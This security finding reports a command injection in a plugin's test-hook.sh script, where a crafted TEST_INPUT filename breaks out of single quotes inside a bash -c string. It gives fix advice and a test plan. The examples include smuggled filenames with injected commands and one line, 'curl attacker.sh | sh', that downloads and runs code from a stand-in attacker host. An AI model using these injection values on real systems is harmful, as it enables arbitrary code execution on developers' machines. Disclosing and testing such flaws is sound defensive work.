### Title
Command injection via unescaped single-quote breakout in `TEST_INPUT` alone - (File: plugins/plugin-dev/skills/hook-development/scripts/test-hook.sh)

### Summary
`test-hook.sh` builds a `bash -c` command string by interpolating `$TEST_INPUT` inside single quotes and `$HOOK_SCRIPT` unquoted, then executes it with `timeout`. Because bash string interpolation does not escape embedded single quotes, an attacker who controls only the `TEST_INPUT` filename argument (a file path, e.g. a filename inside an untrusted repository/plugin being tested) can break out of the quoting and inject arbitrary shell commands — without needing any control over `HOOK_SCRIPT` at all.

### Finding Description
Line 190 constructs the command executed via `bash -c`: [1](#0-0) 

```
output=$(timeout "$TIMEOUT" bash -c "cat '$TEST_INPUT' | $HOOK_SCRIPT" 2>&1)
```

`$TEST_INPUT` is wrapped in single quotes for the `cat` argument, but the value itself is not sanitized or escaped before substitution. If `TEST_INPUT` contains a single quote (`'`), it terminates the quoted string early. Combined with a semicolon and a `#` comment character, the attacker can:
1. Close the intended single-quoted `cat` argument early.
2. Insert `;` to start a new shell command.
3. Insert arbitrary shell command(s).
4. Append `#` to comment out the remainder of the line (including the `| $HOOK_SCRIPT` pipe), so the fixed/trusted `HOOK_SCRIPT` value is irrelevant to the attack.

Example malicious `TEST_INPUT` value: `x'; touch /tmp/pwned; echo '` or, as a filename passed on the command line: `foo'; curl attacker.sh | sh #`.

Before reaching line 190, the only checks performed are: [2](#0-1) 

These validate that the path exists (`-f "$TEST_INPUT"`) and that its *contents* are valid JSON via `jq empty`. Neither check inspects or restricts the *literal string* of the `TEST_INPUT` argument for shell metacharacters — a file can be validly named `x'; touch /tmp/pwned #.json` and contain valid JSON, passing both checks while still causing injection when substituted into the `bash -c` string. There is no allowlist, escaping (e.g. `printf %q`), or use of an array-based/no-shell invocation to prevent this.

This confirms the premise in the question: even with `HOOK_SCRIPT` fixed to a fully trusted, no-op script path, an attacker controlling only `TEST_INPUT` can still achieve arbitrary command execution, because the single-quote breakout plus `#` comment lets the attacker discard the rest of the command line (including any reference to `HOOK_SCRIPT`) rather than needing to specifically "reinterpret" it.

### Impact Explanation
Arbitrary command execution in the environment where `test-hook.sh` runs (the developer's or an automated agent's shell), triggered purely by supplying/naming a `TEST_INPUT` file with a crafted name/path. This is an unauthorized command execution / trust-boundary bypass: a party that only influences the test-input file path (e.g., a malicious file shipped inside a plugin repository being tested by a developer or by an automated Claude Code workflow) can execute code with the privileges of whoever runs the script, independent of what hook script is being tested.

### Likelihood Explanation
Feasibility is high and fully reproducible: the vulnerability is a straightforward shell-quoting flaw, not dependent on race conditions or timing. The main precondition is that the `TEST_INPUT` argument (a file path string) is influenced by an untrusted source — e.g., a plugin/skill development or review workflow where Claude Code or a developer runs this utility against files whose names come from a third-party or attacker-supplied repository. Since this script is documented as part of the standard `hook-development` skill workflow (invoked via `./test-hook.sh <hook-script> <test-input.json>`) it is plausible for filenames to be derived from repository content during automated plugin testing/review.

### Recommendation
- Avoid constructing shell commands via string interpolation into `bash -c`. Instead, invoke `cat` and the hook script directly with argument arrays, e.g. run `cat "$TEST_INPUT"` piped into executing `"$HOOK_SCRIPT"` using native shell pipe syntax with quoted variables (no `bash -c` string reassembly), or use `printf %q` to safely quote both `TEST_INPUT` and `HOOK_SCRIPT` before building the `bash -c` string.
- Reject `TEST_INPUT`/`HOOK_SCRIPT` values containing shell metacharacters (`'`, `;`, `|`, `` ` ``, `$`, `#`, `&`) before use, or canonicalize/validate them strictly as file paths.
- Never split `HOOK_SCRIPT` into `bash $HOOK_SCRIPT` as a raw string (line 146) either — pass it as a proper argument to `bash "$HOOK_SCRIPT"` executed directly, not embedded in another shell string.

### Proof of Concept
Unit/integration test plan:
1. Create a trusted no-op hook script `trusted_hook.sh` (fixed, non-attacker-controlled), e.g. `#!/bin/bash\ncat > /dev/null\necho '{"decision":"approve"}'`, made executable.
2. Fuzz only the `TEST_INPUT` argument with filenames containing shell metacharacters while keeping `HOOK_SCRIPT` fixed to `trusted_hook.sh`:
   - Create a file literally named `x'; touch /tmp/pwned_marker; echo '{}` (or equivalent quoting-breakout names) containing valid JSON `{}` content, in a temp directory.
   - Run `./test-hook.sh trusted_hook.sh "$(printf '%s' "<malicious-name>")"`.
3. Assert that `/tmp/pwned_marker` (or another injected side-effect marker) is NOT created, and that no process other than `cat` and `trusted_hook.sh` executes — this assertion currently FAILS given the code at line 190, demonstrating the injection.
4. Repeat fuzzing across a corpus of single-quote/backtick/`;`/`#`/`$()`-laden filenames to confirm consistent, repeatable command execution outside the intended `cat`/hook-script scope.

### Citations

**File:** plugins/plugin-dev/skills/hook-development/scripts/test-hook.sh (L149-158)
```shellscript
if [ ! -f "$TEST_INPUT" ]; then
  echo "❌ Error: Test input not found: $TEST_INPUT"
  exit 1
fi

# Validate test input JSON
if ! jq empty "$TEST_INPUT" 2>/dev/null; then
  echo "❌ Error: Test input is not valid JSON"
  exit 1
fi
```

**File:** plugins/plugin-dev/skills/hook-development/scripts/test-hook.sh (L189-192)
```shellscript
set +e
output=$(timeout "$TIMEOUT" bash -c "cat '$TEST_INPUT' | $HOOK_SCRIPT" 2>&1)
exit_code=$?
set -e
```
